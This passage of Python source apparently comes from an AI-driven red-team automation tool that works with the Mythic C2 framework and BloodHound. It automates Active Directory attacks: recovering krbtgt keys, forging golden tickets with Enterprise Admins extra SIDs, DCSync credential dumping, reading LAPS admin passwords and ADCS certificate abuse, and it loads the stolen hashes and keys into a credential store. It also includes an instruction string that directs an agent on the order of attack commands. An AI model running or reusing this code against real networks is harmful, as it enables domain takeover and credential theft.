                inputs.get("proof_resource") or inputs.get("service_resource") or inputs.get("target_resource")
            ):
                host = self._capability_host_name(target_host, target_domain)
                inputs["proof_resource"] = f"\\\\{host}\\C$"
                inputs["proof_service"] = "cifs"
            if not self._capability_text(
                inputs.get("password")
                or inputs.get("local_admin_password")
                or inputs.get("managed_local_admin_secret")
                or inputs.get("secret")
                or inputs.get("credential")
                or inputs.get("credential_text")
            ):
                credential = await self._select_managed_local_admin_credential(
                    target_host,
                    target_domain,
                    local_account,
                )
                if credential:
                    inputs["password"] = credential["credential"]
                    inputs["credential_id"] = credential.get("id")
                    inputs["credential_source"] = "mythic_credential_store"
                    inputs["credential_realm"] = credential.get("realm")
                    inputs["credential_account"] = credential.get("account")
            return
        if capability == "read-managed-local-admin-secret":
            account = self._capability_account(action, inputs)
            account_domain = self._capability_account_domain(action, inputs)
            target_host = self._capability_target_host(action, inputs)
            target_domain = self._capability_managed_secret_target_domain(action, inputs)
            callback_id = self._capability_callback_id(action, inputs)
            if account:
                inputs["account"] = account
            if account_domain:
                inputs["account_domain"] = account_domain
            if target_host:
                inputs["target_host"] = target_host
            if target_domain:
                inputs["target_domain"] = target_domain
            if callback_id:
                inputs["callback_id"] = callback_id
            if target_domain and not self._capability_text(inputs.get("domain_controller") or inputs.get("dc")):
                host = await self._resolve_domain_controller_host(target_domain)
                if host:
                    inputs["domain_controller"] = host
                    inputs["domain_controller_source"] = f"BloodHound Domain Controllers membership for {target_domain}"
            return
        if capability == "ensure-account-kerberos-context":
            domain = self._capability_domain(action, inputs)
            account = self._capability_account(action, inputs)
            callback_id = self._capability_callback_id(action, inputs)
            if domain:
                inputs["domain"] = domain
            if account:
                inputs["account"] = account
            if callback_id:
                inputs["callback_id"] = callback_id
            if not self._capability_has_ticket_key(inputs):
                credential = await self._select_account_credential(domain, account)
                if credential:
                    inputs["key"] = credential["credential"]
                    inputs["key_type"] = credential["key_type"]
                    inputs["credential_id"] = credential.get("id")
                    inputs["credential_source"] = "mythic_credential_store"
            context_password = self._capability_text(
                inputs.get("context_password") or inputs.get("logon_password") or "SageNetOnlyContext1!"
            )
            logon_credential = await self._ensure_netonly_plaintext_credential(domain, context_password)
            if logon_credential:
                inputs["logon_credential_id"] = logon_credential.get("id")
                inputs["logon_credential_source"] = logon_credential.get("status")
            self._sanitize_account_context_proof_target(action, inputs)
            self._normalize_capability_service_proof_target(action, inputs, default_share="SYSVOL")
            await self._augment_capability_account_ticket_proof_target(inputs, domain)
            return
        if capability == "ensure-kerberos-context":
            domain = self._capability_source_domain(action, inputs)
            target_domain = self._capability_target_domain(action, inputs) or self._capability_domain(action, inputs)
            if domain:
                inputs["source_domain"] = domain
            if target_domain:
                inputs["target_domain"] = target_domain
        else:
            domain = self._capability_domain(action, inputs)
            target_domain = self._capability_target_domain(action, inputs)
        if "target_domain" not in inputs and "effect_domain" not in inputs:
            parent = self._parent_domain_for_capability(domain)
            if parent and parent != domain and (
                inputs.get("extra_sids") or inputs.get("parent_domain_sid") or inputs.get("enterprise_admins_sid")
            ):
                inputs["target_domain"] = parent
                target_domain = parent

        source_sid = await self._resolve_domain_sid(domain)
        if source_sid:
            inputs["domain_sid"] = source_sid
            inputs["domain_sid_source"] = f"BloodHound Domain.objectid for {domain}"
            self._remove_capability_input_error(inputs, "invalid_domain_sid")

        if target_domain and target_domain != domain:
            target_sid = await self._resolve_domain_sid(target_domain)
            if target_sid:
                inputs["parent_domain_sid"] = target_sid
                inputs["parent_domain_sid_source"] = f"BloodHound Domain.objectid for {target_domain}"
                inputs.pop("enterprise_admins_sid", None)
                inputs.pop("extra_sids", None)
                self._remove_capability_input_error(inputs, "invalid_parent_domain_sid")
                self._remove_capability_input_error(inputs, "invalid_enterprise_admins_sid")
                self._remove_capability_input_error(inputs, "invalid_extra_sids")
                self._normalize_capability_ticket_inputs(inputs)

        intent = getattr(action, "intent", {}) if isinstance(getattr(action, "intent", {}), dict) else {}
        ticket_acquisition_strategy = self._capability_text(
            inputs.get("kerberos_ticket_acquisition_strategy")
            or inputs.get("ticket_acquisition_strategy")
            or inputs.get("service_ticket_strategy")
            or intent.get("kerberos_ticket_acquisition_strategy")
            or intent.get("ticket_acquisition_strategy")
            or intent.get("service_ticket_strategy")
            or "os-native"
        ).casefold()
        explicit_tgs_exchange = ticket_acquisition_strategy in {
            "asktgs",
            "explicit",
            "explicit-asktgs",
            "explicit_asktgs",
            "explicit-tgs",
            "explicit_tgs",
            "rubeus-asktgs",
            "rubeus_asktgs",
        }

        # Explicit cross-domain TGS fallback needs TWO domain controllers: the parent DC (already resolved as
        # proof_host on the effect domain, below) is where the access proof runs, and the CHILD DC is where the
        # inter-realm referral hop must be presented. The default OS-native path does not need to resolve that
        # extra input because Windows requests the referral from the imported current-session TGT on demand.
        if (
            capability == "forge-golden-ticket"
            and target_domain
            and target_domain != domain
            and explicit_tgs_exchange
            and not self._capability_text(inputs.get("child_dc") or inputs.get("source_dc"))
        ):
            child_dc = self._capability_host_name(
                await self._resolve_domain_controller_host(domain), domain
            )
            if child_dc:
                inputs["child_dc"] = child_dc
                inputs["child_dc_source"] = f"BloodHound Domain Controllers membership for {domain}"

        if not self._capability_has_ticket_key(inputs):
            credential = await self._select_krbtgt_credential(domain)
            if credential:
                inputs["key"] = credential["credential"]
                inputs["key_type"] = credential["key_type"]
                inputs["credential_id"] = credential.get("id")
                inputs["credential_source"] = "mythic_credential_store"

        self._normalize_capability_service_proof_target(action, inputs, default_share="C$")
        if capability == "ensure-kerberos-context":
            self._sanitize_admin_context_proof_target(action, inputs, default_share="C$")
        await self._augment_capability_ticket_proof_target(inputs, target_domain or domain)

    async def _augment_capability_account_ticket_proof_target(self, inputs: dict, domain: str) -> None:
        if self._capability_text(inputs.get("proof_resource") or inputs.get("service_resource")):
            return
        domain_cf = self._capability_text(domain).casefold()
        host = self._capability_text(
            inputs.get("proof_host")
            or inputs.get("service_host")
            or inputs.get("target_host")
            or inputs.get("dc")
            or inputs.get("domain_controller")
        )
        source = ""
        if not host and domain_cf:
            host = await self._resolve_domain_controller_host(domain_cf)
            if host:
                source = f"BloodHound Domain Controllers membership for {domain_cf}"
        host = self._capability_host_name(host, domain_cf)
        if not host:
            return
        inputs.setdefault("proof_host", host)
        inputs.setdefault("proof_resource", f"\\\\{host}\\SYSVOL")
        inputs.setdefault("proof_service", "cifs")
        if source:
            inputs.setdefault("proof_resource_source", source)

    async def _augment_capability_ticket_proof_target(self, inputs: dict, effect_domain: str) -> None:
        if self._capability_text(inputs.get("proof_resource") or inputs.get("service_resource")):
            return
        domain = self._capability_text(effect_domain).casefold()
        host = self._capability_text(
            inputs.get("proof_host")
            or inputs.get("service_host")
            or inputs.get("target_host")
            or inputs.get("dc")
            or inputs.get("domain_controller")
        )
        source = ""
        if not host and domain:
            host = await self._resolve_domain_controller_host(domain)
            if host:
                source = f"BloodHound Domain Controllers membership for {domain}"
        host = self._capability_host_name(host, domain)
        if not host:
            return
        inputs.setdefault("proof_host", host)
        inputs.setdefault("proof_resource", f"\\\\{host}\\C$")
        inputs.setdefault("proof_service", "cifs")
        if source:
            inputs.setdefault("proof_resource_source", source)

    def _validate_capability_ticket_sid_sources(self, action, inputs: dict) -> None:
        capability = self._capability_text(getattr(action, "name", "")).casefold()
        if capability not in {"forge-golden-ticket", "ensure-kerberos-context"} or not isinstance(inputs, dict):
            return
        if capability == "ensure-kerberos-context":
            domain = self._capability_source_domain(action, inputs)
            target_domain = self._capability_target_domain(action, inputs) or self._capability_domain(action, inputs)
        else:
            domain = self._capability_domain(action, inputs)
            target_domain = self._capability_target_domain(action, inputs)
        if not target_domain and inputs.get("extra_sids"):
            target_domain = self._parent_domain_for_capability(domain)
        if target_domain and target_domain != domain and inputs.get("extra_sids") and not self._has_trusted_extra_sid_source(inputs):
            self._add_capability_input_error(inputs, "missing_extra_sids_source")

    def _normalize_capability_ticket_inputs(self, inputs: dict) -> None:
        if not isinstance(inputs, dict):
            return
        if "domain_sid" not in inputs:
            for alias in ("child_domain_sid", "source_domain_sid", "sid"):
                if self._capability_text(inputs.get(alias)):
                    inputs["domain_sid"] = inputs[alias]
                    break
        if self._capability_text(inputs.get("domain_sid")) and not self._is_domain_sid(inputs.get("domain_sid")):
            self._add_capability_input_error(inputs, "invalid_domain_sid")
        if not inputs.get("extra_sids"):
            ea_sid = self._capability_text(inputs.get("enterprise_admins_sid"))
            parent_sid = self._capability_text(inputs.get("parent_domain_sid") or inputs.get("root_domain_sid"))
            if ea_sid:
                normalized = self._normalize_enterprise_admins_sid(ea_sid)
                if normalized:
                    inputs["extra_sids"] = [normalized]
                else:
                    self._add_capability_input_error(inputs, "invalid_enterprise_admins_sid")
            elif parent_sid:
                normalized = self._normalize_parent_enterprise_admins_sid(parent_sid)
                if normalized:
                    inputs["extra_sids"] = [normalized]
                else:
                    self._add_capability_input_error(inputs, "invalid_parent_domain_sid")
        elif inputs.get("extra_sids"):
            normalized_extra_sids = []
            for sid in self._capability_sid_list(inputs.get("extra_sids")):
                if self._is_sid(sid):
                    normalized_extra_sids.append(sid)
                else:
                    self._add_capability_input_error(inputs, "invalid_extra_sids")
            if normalized_extra_sids:
                inputs["extra_sids"] = normalized_extra_sids

    async def _select_krbtgt_credential(self, domain: str) -> dict:
        domain_cf = self._capability_text(domain).casefold()
        if not domain_cf:
            return {}
        creds = await self._fetch_credentials_cached(datetime.now(timezone.utc).isoformat())
        candidate = self._best_kerberos_key_credential(creds, "krbtgt", domain_cf)
        if candidate:
            return candidate
        recovered = await self._recover_krbtgt_credential_from_recorded_task(domain_cf)
        if recovered:
            return recovered
        return {}

    def _best_kerberos_key_credential(self, creds: list | tuple, account: str, realm: str) -> dict:
        account_cf = self._canonical_credential_account(account)
        realm_cf = self._capability_text(realm).casefold()
        candidates = []
        for cred in creds or []:
            if not isinstance(cred, dict):
                continue
            row_account = self._canonical_credential_account(cred.get("account"))
            row_realm = self._capability_text(cred.get("realm")).casefold()
            secret = self._capability_text(cred.get("credential_text") or cred.get("credential")).strip()
            if row_account != account_cf or row_realm != realm_cf or not secret:
                continue
            key_type = self._account_credential_key_type(cred, secret)
            if key_type not in {"aes256", "aes128", "rc4"}:
                continue
            priority = {"aes256": 0, "aes128": 1, "rc4": 2}.get(key_type, 9)
            candidates.append((priority, {
                "id": cred.get("id"),
                "credential": secret,
                "key_type": key_type,
            }))
        if not candidates:
            return {}
        candidates.sort(key=lambda item: item[0])
        return candidates[0][1]

    async def _recover_krbtgt_credential_from_recorded_task(self, domain: str) -> dict:
        domain_cf = self._capability_text(domain).casefold()
        task_ids: list[int] = []
        for hop in reversed(list(getattr(self, "_engagement_hops", []) or [])):
            status = self._capability_text(getattr(hop, "status", "")).casefold()
            if status != "achieved":
                continue
            effects = [self._capability_text(getattr(hop, "effect", ""))]
            effects.extend(self._capability_text(item) for item in (getattr(hop, "satisfied_effects", []) or []))
            if f"krbtgt-hash:{domain_cf}" not in {item.casefold() for item in effects if item}:
                continue
            evidence = getattr(hop, "evidence", {}) if isinstance(getattr(hop, "evidence", {}), dict) else {}
            task_id = evidence.get("mythic_task_id") or evidence.get("task_id") or evidence.get("source_task_id")
            try:
                task_ids.append(int(task_id))
            except Exception:
                continue
        for task_id in task_ids:
            output = await self._fetch_plain_task_output(task_id)
            material = self._extract_credential_material(output, account="krbtgt", realm=domain_cf)
            if not material:
                continue
            await self._import_credential_material(material, source_task_id=task_id)
            candidate = self._best_credential_material_candidate(material)
            if candidate:
                return candidate
        return {}

    async def _fetch_plain_task_output(self, task_id: int) -> str:
        if self.client is None:
            return ""
        cached = getattr(self, "_task_output_cache", {}).get(int(task_id))
        if cached:
            return cached
        try:
            resp = await mythic.get_all_task_output_by_id(mythic=self.client, task_display_id=int(task_id))
        except Exception:
            return ""
        chunks: list[str] = []
        for item in resp if isinstance(resp, list) else [resp]:
            if isinstance(item, bytes):
                chunks.append(item.decode("utf-8", "replace"))
                continue
            if not isinstance(item, dict):
                chunks.append(self._capability_text(item))
                continue
            raw = item.get("response_text") or item.get("response") or ""
            if isinstance(raw, bytes):
                chunks.append(raw.decode("utf-8", "replace"))
                continue
            text = self._capability_text(raw)
            if text:
                try:
                    chunks.append(base64.b64decode(text).decode("utf-8", "replace"))
                    continue
                except Exception:
                    pass
                chunks.append(text)
        result = "\n".join(chunk for chunk in chunks if chunk)
        if result:
            self._task_output_cache[int(task_id)] = result
        return result

    def _extract_credential_material(self, output: str, *, account: str, realm: str) -> list[dict[str, str]]:
        try:
            try:
                from . import credential_artifacts
            except ImportError:
                import credential_artifacts
            return list(credential_artifacts.extract_credential_material(output, account=account, realm=realm))
        except Exception:
            return []

    def _best_credential_material_candidate(self, material: list[dict[str, str]]) -> dict:
        candidates = []
        for item in material or []:
            if not isinstance(item, dict):
                continue
            secret = self._capability_text(item.get("credential")).strip()
            secret_type = self._capability_text(item.get("secret_type")).casefold()
            key_type = secret_type if secret_type in {"aes256", "aes128"} else self._infer_capability_key_type(secret)
            if key_type not in {"aes256", "aes128", "rc4"}:
                continue
            priority = {"aes256": 0, "aes128": 1, "rc4": 2}.get(key_type, 9)
            candidates.append((priority, {"credential": secret, "key_type": key_type}))
        if not candidates:
            return {}
        candidates.sort(key=lambda item: item[0])
        return candidates[0][1]

    async def _import_credential_material(self, material: list[dict[str, str]], *, source_task_id: int | str = "") -> list[dict]:
        if self.client is None or not material:
            return []
        existing = await self._fetch_credentials_cached(datetime.now(timezone.utc).isoformat())
        refs: list[dict] = []
        for item in material:
            if not isinstance(item, dict):
                continue
            account = self._capability_text(item.get("account")).strip()
            realm = self._capability_text(item.get("realm")).strip().casefold()
            credential = self._capability_text(item.get("credential")).strip()
            secret_type = self._capability_text(item.get("secret_type")).strip().casefold()
            credential_type = self._capability_text(item.get("credential_type")).strip() or (
                "key" if secret_type.startswith("aes") else "hash"
            )
            if not account or not realm or not credential:
                continue
            duplicate = False
            for row in existing or []:
                if self._capability_text(row.get("account")).casefold() != account.casefold():
                    continue
                if self._capability_text(row.get("realm")).casefold() != realm:
                    continue
                if self._capability_text(row.get("credential_text")).casefold() == credential.casefold():
                    refs.append({
                        "id": row.get("id"),
                        "account": account,
                        "realm": realm,
                        "secret_type": secret_type,
                        "credential_type": credential_type,
                        "status": "existing",
                    })
                    duplicate = True
                    break
            if duplicate:
                continue
            comment = f"Sage verified {secret_type or credential_type} material"
            if source_task_id:
                comment += f" from Mythic task {source_task_id}"
            try:
                result = await mythic.create_credential(
                    self.client,
                    credential=credential,
                    account=account,
                    realm=realm,
                    comment=comment,
                    credential_type=credential_type,
                )
            except Exception:
                result = {}
            refs.append({
                "id": result.get("id") if isinstance(result, dict) else None,
                "account": account,
                "realm": realm,
                "secret_type": secret_type,
                "credential_type": credential_type,
                "status": "created" if isinstance(result, dict) and result.get("status") == "success" else "extracted",
            })
        if refs:
            self._cred_cache = None
            self._cred_cache_ts = None
        return refs

    async def _import_capability_credential_material(self, action, inputs: dict, output: str, task_id) -> list[dict]:
        capability = self._capability_text(getattr(action, "name", "")).casefold()
        if capability == "read-managed-local-admin-secret":
            material = self._extract_managed_local_admin_credential_material(action, inputs, output)
            if not material:
                return []
            return await self._import_credential_material(material, source_task_id=task_id or "")
        if capability == "adcs-certificate-auth":
            domain = (
                self._capability_target_domain(action, inputs)
                or self._capability_domain(action, inputs)
                or self._capability_account_domain(action, inputs)
            )
            account = self._capability_account(action, inputs) or "administrator"
            if not domain or not account:
                return []
            material = self._extract_credential_material(output, account=account, realm=domain)
            if not material:
                return []
            return await self._import_credential_material(material, source_task_id=task_id or "")
        if capability not in {"dcsync-krbtgt", "dcsync-account", "dcsync"}:
            return []
        domain = self._capability_domain(action, inputs)
        account = self._capability_account(action, inputs)
        if capability in {"dcsync-krbtgt", "dcsync"} and not account:
            account = "krbtgt"
        if not domain or not account:
            return []
        material = self._extract_credential_material(output, account=account, realm=domain)
        if not material:
            return []
        return await self._import_credential_material(material, source_task_id=task_id or "")

    def _extract_managed_local_admin_credential_material(self, action, inputs: dict, output: str) -> list[dict[str, str]]:
        target_host = self._capability_target_host(action, inputs)
        target_domain = self._capability_managed_secret_target_domain(action, inputs)
        local_account = self._capability_local_account(action, inputs) or "Administrator"
        host_short = self._capability_host_short(target_host)
        if not host_short:
            return []
        realm = self._capability_host_name(host_short, target_domain).casefold() or host_short
        text = self._capability_text(output)
        for attr in ("ms-mcs-admpwd", "mslaps-password"):
            attr_rx = re.escape(attr).replace("\\-", "[-_]")
            match = re.search(
                rf"(?im)^\s*{attr_rx}\s*[:=]\s*(.+?)\s*$",
                text,
            )
            if not match:
                continue
            secret = match.group(1).strip().strip("'\"")
            if not secret or len(secret) < 4:
                continue
            return [{
                "account": local_account,
                "realm": realm,
                "credential": secret,
                "secret_type": "managed-local-admin-secret",
                "credential_type": "plaintext",
            }]
        return []

    async def _select_account_credential(self, domain: str, account: str) -> dict:
        domain_cf = self._capability_text(domain).casefold()
        account_cf = self._canonical_credential_account(account)
        if not domain_cf or not account_cf:
            return {}
        creds = await self._fetch_credentials_cached(datetime.now(timezone.utc).isoformat())
        candidates = []
        for cred in creds or []:
            row_account = self._canonical_credential_account(cred.get("account"))
            realm = self._capability_text(cred.get("realm")).casefold()
            secret = self._capability_text(cred.get("credential_text")).strip()
            if row_account != account_cf or realm != domain_cf or not secret:
                continue
            key_type = self._account_credential_key_type(cred, secret)
            if key_type not in {"aes256", "aes128", "rc4"}:
                continue
            priority = {"aes256": 0, "aes128": 1, "rc4": 2}.get(key_type, 9)
            candidates.append((priority, {
                "id": cred.get("id"),
                "credential": secret,
                "key_type": key_type,
            }))
        if not candidates:
            recovered = await self._recover_account_credential_from_recorded_task(domain_cf, account_cf)
            return recovered if recovered else {}
        candidates.sort(key=lambda item: item[0])
        return candidates[0][1]

    async def _ensure_netonly_plaintext_credential(self, domain: str, password: str) -> dict:
        domain_cf = self._capability_text(domain).casefold()
        password_text = self._capability_text(password)
        if not domain_cf or not password_text or self.client is None:
            return {}
        account = "sage.netonly"
        creds = await self._fetch_credentials_cached(datetime.now(timezone.utc).isoformat())
        for cred in creds or []:
            if self._canonical_credential_account(cred.get("account")) != account:
                continue
            if self._capability_text(cred.get("realm")).casefold() != domain_cf:
                continue
            if self._capability_text(cred.get("type")).casefold() != "plaintext":
                continue
            if self._capability_text(cred.get("credential_text")) != password_text:
                continue
            if cred.get("id") is not None:
                return {"id": cred.get("id"), "status": "existing"}
        try:
            result = await mythic.create_credential(
                self.client,
                credential=password_text,
                account=account,
                realm=domain_cf,
                comment="Sage sacrificial NetOnly context; not a valid account password",
                credential_type="plaintext",
            )
        except Exception:
            return {}
        credential_id = result.get("id") if isinstance(result, dict) else None
        if credential_id is None:
            return {}
        self._cred_cache = None
        self._cred_cache_ts = None
        return {"id": credential_id, "status": "created"}

    async def _recover_account_credential_from_recorded_task(self, domain: str, account: str) -> dict:
        domain_cf = self._capability_text(domain).casefold()
        account_cf = self._canonical_credential_account(account)
        if not domain_cf or not account_cf:
            return {}
        target_effect = f"creds:{account_cf}@{domain_cf}"
        certificate_effect = f"certificate-auth:{account_cf}@{domain_cf}"
        task_ids: list[int] = []
        for hop in reversed(list(getattr(self, "_engagement_hops", []) or [])):
            status = self._capability_text(getattr(hop, "status", "")).casefold()
            if status != "achieved":
                continue
            effects = [self._capability_text(getattr(hop, "effect", ""))]
            effects.extend(self._capability_text(item) for item in (getattr(hop, "satisfied_effects", []) or []))
            canonical_effects = {
                self._canonical_capability_effect(item)
                for item in effects
                if self._capability_text(item)
            }
            if target_effect not in canonical_effects and certificate_effect not in canonical_effects:
                continue
            evidence = getattr(hop, "evidence", {}) if isinstance(getattr(hop, "evidence", {}), dict) else {}
            task_id = evidence.get("mythic_task_id") or evidence.get("task_id") or evidence.get("source_task_id")
            try:
                task_ids.append(int(task_id))
            except Exception:
                continue
        for task_id in task_ids:
            output = await self._fetch_plain_task_output(task_id)
            material = self._extract_credential_material(output, account=account_cf, realm=domain_cf)
            if not material:
                continue
            await self._import_credential_material(material, source_task_id=task_id)
            candidate = self._best_credential_material_candidate(material)
            if candidate:
                return candidate
        return {}

    async def _select_managed_local_admin_credential(self, target_host: str, target_domain: str, local_account: str) -> dict:
        host_cf = self._capability_host_short(target_host)
        domain_cf = self._capability_text(target_domain).casefold()
        account_cf = self._capability_text(local_account or "Administrator").casefold()
        if not host_cf or not account_cf:
            return {}
        host_fqdn = self._capability_host_name(host_cf, domain_cf).casefold()
        realm_matches = {host_cf, host_fqdn}
        if domain_cf:
            realm_matches.add(domain_cf)
        creds = await self._fetch_credentials_cached(datetime.now(timezone.utc).isoformat())
        candidates = []
        for cred in creds or []:
            raw_account = self._capability_text(cred.get("account"))
            row_account = raw_account.casefold()
            realm = self._capability_text(cred.get("realm")).casefold()
            secret = self._capability_text(cred.get("credential_text")).strip()
            if not secret:
                continue
            label = " ".join([
                self._capability_text(cred.get("type")),
                self._capability_text(cred.get("comment")),
                self._capability_text(cred.get("secret_type")),
                self._capability_text(cred.get("credential_type")),
            ]).casefold()
            if any(token in label for token in ("ticket", "hash", "aes", "rc4", "ntlm")):
                continue
            embedded_realm = ""
            embedded_account = row_account
            if "\\" in row_account:
                embedded_realm, embedded_account = row_account.split("\\", 1)
            elif "@" in row_account:
                embedded_account, embedded_realm = row_account.split("@", 1)
            if embedded_account != account_cf:
                continue
            host_in_comment = host_cf and host_cf in label
            realm_match = realm in realm_matches or embedded_realm in realm_matches
            if not realm_match and not host_in_comment:
                continue
            priority = 0 if realm in {host_cf, host_fqdn} or embedded_realm in {host_cf, host_fqdn} else 1
            if "laps" in label or "local admin" in label or "managed" in label:
                priority -= 1
            candidates.append((priority, {
                "id": cred.get("id"),
                "account": raw_account or local_account or "Administrator",
                "realm": realm or embedded_realm,
                "credential": secret,
            }))
        if not candidates:
            recovered = await self._recover_managed_local_admin_credential_from_recorded_task(
                host_cf,
                domain_cf,
                account_cf,
            )
            if recovered:
                return recovered
            return {}
        candidates.sort(key=lambda item: item[0])
        return candidates[0][1]

    async def _recover_managed_local_admin_credential_from_recorded_task(
        self,
        target_host: str,
        target_domain: str,
        local_account: str,
    ) -> dict:
        host_cf = self._capability_host_short(target_host)
        domain_cf = self._capability_text(target_domain).casefold()
        account = self._capability_text(local_account or "Administrator") or "Administrator"
        if not host_cf or not domain_cf:
            return {}
        wanted_effect = f"managed-local-admin-secret:{host_cf}@{domain_cf}"
        task_ids: list[int] = []
        for hop in reversed(list(getattr(self, "_engagement_hops", []) or [])):
            if self._capability_text(getattr(hop, "status", "")).casefold() != "achieved":
                continue
            effects = [self._capability_text(getattr(hop, "effect", ""))]
            effects.extend(self._capability_text(item) for item in (getattr(hop, "satisfied_effects", []) or []))
            if wanted_effect not in {item.casefold() for item in effects if item}:
                continue
            evidence = getattr(hop, "evidence", {}) if isinstance(getattr(hop, "evidence", {}), dict) else {}
            task_id = evidence.get("mythic_task_id") or evidence.get("task_id") or evidence.get("source_task_id")
            try:
                task_ids.append(int(task_id))
            except Exception:
                continue
        for task_id in task_ids:
            output = await self._fetch_plain_task_output(task_id)
            material = self._extract_managed_local_admin_credential_material(
                None,
                {
                    "target_host": host_cf,
                    "target_domain": domain_cf,
                    "local_account": account,
                },
                output,
            )
            if not material:
                continue
            refs = await self._import_credential_material(material, source_task_id=task_id)
            if refs:
                return {
                    "id": refs[0].get("id"),
                    "account": account,
                    "realm": material[0].get("realm") or domain_cf,
                    "credential": material[0].get("credential"),
                }
        return {}

    def _account_credential_key_type(self, cred: dict, secret: str) -> str:
        label = " ".join([
            self._capability_text(cred.get("type")),
            self._capability_text(cred.get("comment")),
            self._capability_text(cred.get("secret_type")),
            self._capability_text(cred.get("credential_type")),
        ]).casefold()
        if "aes256" in label:
            return "aes256"
        if "aes128" in label:
            return "aes128"
        if "ntlm" in label or "rc4" in label:
            return "rc4"
        return self._infer_capability_key_type(secret)

    async def _resolve_domain_sid(self, domain: str) -> str:
        domain_cf = self._capability_text(domain).casefold()
        if not domain_cf:
            return ""
        cached = getattr(self, "_domain_sid_cache", {}).get(domain_cf)
        if cached:
            return cached
        cypher_tool = self._bloodhound_cypher_tool()
        if cypher_tool is None:
            return ""
        safe_domain = domain_cf.replace("\\", "").replace("'", "")
        query = (
            "MATCH (d:Domain) "
            f"WHERE toLower(d.name) = '{safe_domain}' "
            "RETURN DISTINCT d.objectid AS sid"
        )
        try:
            payload = await asyncio.wait_for(
                cypher_tool.ainvoke({"info_type": "run", "query": query, "include_properties": False}),
                timeout=10,
            )
        except Exception:
            return ""
        for value in self._mcp_literal_values(payload):
            sid = self._capability_text(value)
            if self._is_domain_sid(sid):
                self._domain_sid_cache[domain_cf] = sid
                return sid
        sid = await self._resolve_domain_sid_from_account_object(domain_cf, cypher_tool)
        if sid:
            self._domain_sid_cache[domain_cf] = sid
            return sid
        return ""

    async def _resolve_domain_sid_from_account_object(self, domain_cf: str, cypher_tool) -> str:
        safe_domain = self._capability_text(domain_cf).casefold().replace("\\", "").replace("'", "")
        if not safe_domain or cypher_tool is None:
            return ""
        query = (
            "MATCH (n) "
            "WHERE (n:User OR n:Computer) AND ("
            f"toLower(n.domain) = '{safe_domain}' OR "
            f"toLower(n.name) ENDS WITH '@{safe_domain}') "
            "AND (toLower(n.name) STARTS WITH 'administrator@' OR "
            "toLower(n.name) STARTS WITH 'krbtgt@' OR "
            "toLower(n.name) STARTS WITH 'guest@') "
            "RETURN DISTINCT n.objectid AS sid ORDER BY sid LIMIT 10"
        )
        try:
            payload = await asyncio.wait_for(
                cypher_tool.ainvoke({"info_type": "run", "query": query, "include_properties": False}),
                timeout=10,
            )
        except Exception:
            return ""
        for value in self._mcp_literal_values(payload):
            sid = self._domain_sid_from_object_sid(value)
            if sid:
                return sid
        return ""

    def _domain_sid_from_object_sid(self, value) -> str:
        sid = self._capability_text(value)
        if self._is_domain_sid(sid):
            return sid
        if not self._is_sid(sid):
            return ""
        parts = sid.split("-")
        if len(parts) < 8 or parts[:4] != ["S", "1", "5", "21"]:
            return ""
        candidate = "-".join(parts[:-1])
        return candidate if self._is_domain_sid(candidate) else ""

    async def _resolve_domain_controller_host(self, domain: str) -> str:
        domain_cf = self._capability_text(domain).casefold()
        if not domain_cf:
            return ""
        cached = getattr(self, "_domain_controller_cache", {}).get(domain_cf)
        if cached:
            return cached
        cypher_tool = self._bloodhound_cypher_tool()
        if cypher_tool is None:
            return ""
        safe_domain = domain_cf.replace("\\", "").replace("'", "")
        # EXACT-domain match only: a DC belongs to its OWN domain's Domain Controllers (-516) group, so
        # c.domain / g.domain == the queried domain. The previous `c.name ENDS WITH '.<domain>'` clause also
        # matched CHILD-subdomain DCs (e.g. DC01.CHILD.ROOT.EXAMPLE.LOCAL matched 'root.example.local'),
        # so resolving a PARENT domain could return the child DC and break cross-domain dcsync/proof. Range-
        # agnostic (Silas/Forge confirmed).
        query = (
            "MATCH (c:Computer)-[:MemberOf*1..]->(g:Group) "
            "WHERE g.objectid ENDS WITH '-516' AND ("
            f"toLower(c.domain) = '{safe_domain}' OR "
            f"toLower(g.domain) = '{safe_domain}') "
            "RETURN DISTINCT c.name AS name ORDER BY name LIMIT 5"
        )
        try:
            payload = await asyncio.wait_for(
                cypher_tool.ainvoke({"info_type": "run", "query": query, "include_properties": False}),
                timeout=10,
            )
        except Exception:
            return ""
        for value in self._mcp_literal_values(payload):
            host = self._capability_host_name(value, domain_cf)
            if host:
                if not hasattr(self, "_domain_controller_cache"):
                    self._domain_controller_cache = {}
                self._domain_controller_cache[domain_cf] = host
                return host
        return ""

    def _bloodhound_cypher_tool(self):
        try:
            from ai.mcp import MCPManager
            for server in MCPManager.get_connected_servers():
                if not MCPManager.is_bloodhound_server(server):
                    continue
                for tool in MCPManager.get_tools_by_server(server):
                    if getattr(tool, "name", "") == "cypher_query":
                        return tool
        except Exception:
            return None
        return None

    def _mcp_literal_values(self, payload) -> list[str]:
        try:
            text = payload
            if isinstance(payload, list) and payload and isinstance(payload[0], dict):
                text = payload[0].get("text", "")
            if isinstance(text, dict) and "text" in text:
                text = text.get("text", "")
            data = json.loads(text) if isinstance(text, str) else (text or {})
            literals = (((data or {}).get("data") or {}).get("literals")) or []
            values: list[str] = []
            for literal in literals:
                if not isinstance(literal, dict):
                    continue
                value = literal.get("value")
                if isinstance(value, str) and value.strip():
                    values.append(value.strip())
            return values
        except Exception:
            return []

    def _capability_command_plan_payload(self, action, execution_plan, command_plan) -> dict:
        commands = []
        for command in list(getattr(command_plan, "commands", []) or []):
            if is_dataclass(command):
                commands.append(asdict(command))
            elif isinstance(command, dict):
                commands.append(dict(command))
            else:
                commands.append({
                    "command": self._capability_text(getattr(command, "command", "")),
                    "parameters": getattr(command, "parameters", {}),
                    "capability": self._capability_text(getattr(command, "capability", "")),
                    "purpose": self._capability_text(getattr(command, "purpose", "")),
                    "expected_probe": self._capability_text(getattr(command, "expected_probe", "")),
                    "prerequisites": list(getattr(command, "prerequisites", []) or []),
                })
        return {
            "ok": bool(getattr(command_plan, "ok", False)),
            "reason": self._capability_text(getattr(command_plan, "reason", "")),
            "missing": list(getattr(command_plan, "missing", []) or []),
            "action": asdict(action) if is_dataclass(action) else str(action),
            "execution_plan": asdict(execution_plan) if is_dataclass(execution_plan) else str(execution_plan),
            "commands": commands,
            "issue_instruction": (
                "Issue commands in order with issue_task_and_waitfor_task_output. For Kerberos context "
                "capabilities, run the current-context inventory/proof preflight first. If that service proof "
                "succeeds, stop and record the capability result; do not forge, import, or create another "
                "logon session. Only proceed to ticket forge/context creation after the current-context proof "
                "fails. Commands marked deferred consume artifacts produced by prior commands, such as "
                "kerberos_ticket_base64; do not issue them until the artifact value is bound. For ticket "
                "capabilities, the service-proof command that consumes kerberos_ticket_imported and "
